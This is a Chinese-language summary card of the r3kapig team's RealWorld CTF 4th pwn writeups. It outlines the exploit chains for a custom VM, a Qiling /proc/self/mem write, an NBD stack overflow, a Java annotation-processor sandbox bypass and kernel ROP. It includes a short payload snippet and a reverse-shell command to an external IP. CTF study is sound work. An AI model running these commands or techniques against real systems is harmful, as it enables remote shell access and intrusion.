---
title: "RealWorld CTF 4th Writeup by r3kapig"
category: pwn
tags: ["RealWorld CTF 4th", "pwn", "custom-vm", "opcode-bytecode", "qiling-framework", "/proc/self/mem"]
signals: ["RealWorld CTF 4th 2022", "custom-vm", "opcode-bytecode", "qiling-framework", "/proc/self/mem", "nbd-network-block-device", "opt_info-stacking", "annotation-processor", "csp-bypass", "pwn_unknown", "RealWorld", "CTF", "r3kapig", "PWN"]
difficulty: hard
source: "https://www.ctfiot.com/24141.html"
tools: ["Java", "Python", "ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# RealWorld CTF 4th Writeup by r3kapig

> 赛事：RealWorld CTF 4th 2022 | 方向：pwn | 难度：hard | 工具：Java、Python、ROP

## 一句话总结

RealWorld CTF 4th r3kapig 多 PWN 大全：svme 自定义 VM 字节码逃逸 + ql_qiling /proc/self/mem 写 libc + NBD 网络块设备 NBD_OPT_INFO 栈溢出 + Java 注解处理器 RCE + kernel ROP 反弹。

## 攻击链

1. svme 自定义 VM 19 opcode (NOOP/IADD/ISUB/IMUL/ILT/IEQ/BR/BRT/BRF/ICONST/LOAD/GLOAD/STORE/GSTORE/PRINT/POP/CALL/RET/HALT)
2. GSTORE 写 global 段 + LOAD 写 local 段 + STORE -992 偏移触发越界写
3. 算 system 地址 (libc leak 0x7ffff7dea0b3) + __free_hook 改写
4. ql_open ql_qiling 框架: 读 /proc/self/maps 找 python 偏移 + /proc/self/mem 写 __cxa_finalize 改 libc
5. ql_open: openat(2) 拿 dir_fd + openat(257) 拼 "../../../../" 越权
6. read shellcode to free_hook 改 __free_hook=system
7. NBD (Network Block Device) 协议 + NBD_OPT_INFO 栈溢出
8. NBD_OPT_EXPORT_NAME(1) + NBD_OPT_INFO(7) + NBD_OPT_STARTTLS(5)
9. NBD_OPT_INFO 触发 NBD_CMD 解析 + format string + stack overflow
10. canary brute force: 0x408 padding + 0x7 字节爆破 (单字节 error-based)
11. leak_heap + leak_pie + ret2libc system 0x3bb0
12. Java 注解处理器: @Fuck 注释 + FuckProcessor 编译时执行 exp() 读 /flag
13. javac -cp + java -Djava.security.policy==/dev/null 绕 sandbox
14. AnnotationProcessor init() + process() 都调 exp() 读 File /flag
15. kernel ROP: padd 16 + "sleep 3;bash -c ''exec bash -i &>/dev/tcp/49.234.220.122/20191 <&1''"*6

## 关键 payload

```
code=p32(GSTORE)+p32(0)+p32(GLOAD)+p32(0x86)+p32(PUSH)+p32(0x7ffff7e18410-0x7ffff7dea0b3)+p32(ADD) (system 地址) + GSTORE 写 free_hook
```

## 经验教训

自定义 VM GSTORE + STORE 负偏移可越界写 libc；ql_qiling 用户态模拟框架 /proc/self/mem 可任意写；NBD 是 Linux 块设备网络协议，OPT_INFO 处理 format string 触发栈溢出；Java AnnotationProcessor 编译时执行是隐藏 RCE 入口。

## 标签

custom-vm、opcode-bytecode、qiling-framework、/proc/self/mem、nbd-network-block-device、opt_info-stacking、annotation-processor、csp-bypass、kernel-rop

## 参考来源

- https://www.ctfiot.com/24141.html
- 原文件：RealWorld_CTF_4th_Writeup_by_r3kapig.full.md
